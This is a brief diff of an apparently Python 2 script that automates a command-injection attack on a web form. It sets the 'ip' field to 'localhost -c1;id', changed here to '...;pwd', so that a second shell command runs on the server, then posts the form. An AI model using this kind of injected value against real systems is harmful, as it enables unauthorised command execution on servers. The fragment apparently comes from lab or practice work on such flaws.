@@ -129,7 +129,7 @@ response = requests.get(exec_url, headers=headers)
 update_cookies(headers, response)
 parser.clear()
 parser.feed(response.text)
-parser.set_input('ip', 'localhost -c1;id')
+parser.set_input('ip', 'localhost -c1;pwd')
 print parser.get_inputs()
 print headers['Cookie']
 response = requests.post(exec_url, parser.get_inputs(), headers=headers)
